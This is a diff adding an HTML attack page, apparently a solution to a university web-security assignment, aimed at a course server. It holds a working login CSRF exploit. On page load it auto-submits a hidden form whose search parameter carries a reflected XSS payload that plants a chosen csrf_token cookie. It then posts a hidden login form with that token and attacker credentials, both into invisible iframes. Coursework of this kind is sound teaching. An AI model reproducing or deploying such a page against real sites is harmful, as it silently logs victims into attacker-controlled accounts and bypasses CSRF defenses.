@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+    <head>
+
+        <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+        <script>
+        $( document ).ready(function() {
+            document.set_token.submit();
+            //document.csrf2form.submit();
+            //alert( "Ok" );
+        });
+
+
+        </script>
+
+    </head>
+    <!-- <body onload="submit_all()"> -->
+    <body onload="submit_all()">
+        <form action="http://trurl.cs.illinois.edu/search" method="GET"
+        name="set_token" target ="if1">
+            <input type="hidden" name="q" value = "<script>document.cookie='csrf_token=4865eb75c8e5cb68033bf42fc96c35d6';
+            //alert('token');
+            </script>">
+
+        </form>
+        <!--  md5 hash of mhasan11: 4865eb75c8e5cb68033bf42fc96c35d6 -->
+
+
+        <form action="http://trurl.cs.illinois.edu/login?csrfdefense=1&xssdefense=0"
+        method="POST" name="csrf2form" target ="if2">
+            <input type="hidden" name="csrf_token" value = "4865eb75c8e5cb68033bf42fc96c35d6">
+            <input type="hidden" name="username" value="attacker"/>
+            <input type="hidden" name="password" value="l33th4x"/>
+
+        </form>
+
+     <iframe style="display:none;" name="if1"></iframe>
+     <iframe style="display:none;" name="if2"></iframe>
+    </body>
+
+    <script>
+        function submit_all() {
+            //document.set_token.submit();
+            document.csrf2form.submit();
+        }
+    </script>
+
+
+</html>
